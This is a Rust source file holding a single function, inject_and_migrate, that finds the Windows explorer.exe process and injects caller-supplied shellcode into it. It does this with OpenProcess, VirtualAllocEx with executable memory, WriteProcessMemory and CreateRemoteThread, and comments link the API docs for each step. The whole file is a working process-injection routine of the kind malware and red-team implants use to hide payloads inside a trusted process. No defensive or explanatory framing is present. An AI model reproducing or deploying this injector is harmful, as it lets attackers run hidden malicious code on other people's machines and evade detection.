extern crate windows;
use std::{mem, ptr};
use std::ffi::{OsString};
use std::os::windows::ffi::OsStringExt;
use windows::Win32::Foundation::INVALID_HANDLE_VALUE;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32NextW, TH32CS_SNAPPROCESS};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

pub fn inject_and_migrate(shellcode: &[u8]) {
    // Call CreateToolhelp32Snapshot to get a snapshot of all the processes currently running
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.CreateToolhelp32Snapshot.html
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0 as u32) };
    if snapshot == INVALID_HANDLE_VALUE {
        panic!("Could not obtain handle to snapshot");
    }

    // Call Process32Next to iterate over all processes in the snapshot
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.Process32Next.html
    let mut pid: u32 = 0;
    let mut process_entry: PROCESSENTRY32W = unsafe { mem::zeroed() };
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
    while unsafe {Process32NextW(snapshot, &mut process_entry).as_bool() } {
        let process_name = OsString::from_wide(&process_entry.szExeFile).into_string().unwrap();
        if process_name.contains("explorer.exe") {
            pid = process_entry.th32ProcessID;
            break;
        }
    }
    if pid == 0 {
        panic!("Could not find an explorer.exe process");
    }

    // Call OpenProcess to get a handle to the target process via its PID
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.OpenProcess.html
    let explorer_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };

    // Call VirtualAllocEx to allocate memory for the shellcode
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Memory/fn.VirtualAllocEx.html
    let base_address = unsafe { VirtualAllocEx(explorer_handle, ptr::null(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };

    // Call WriteProcessMemory to write the contents of the shellcode into the memory allocated above
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
    //let shellcode_c_void = shellcode.as_ptr() as *const c_void;
    let write_result = unsafe { WriteProcessMemory(explorer_handle, base_address, shellcode.as_ptr() as _, shellcode.len(), ptr::null_mut()) };
    if !write_result.as_bool() {
        panic!("WriteProcessMemory failed");
    }

    // Call CreateRemoteThread to create the execution thread in the target PID
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateRemoteThread.html
    let start_address_option = unsafe { Some(mem::transmute(base_address)) };
    unsafe { CreateRemoteThread(explorer_handle, ptr::null(), 0, start_address_option, ptr::null(), 0, ptr::null_mut()) };
}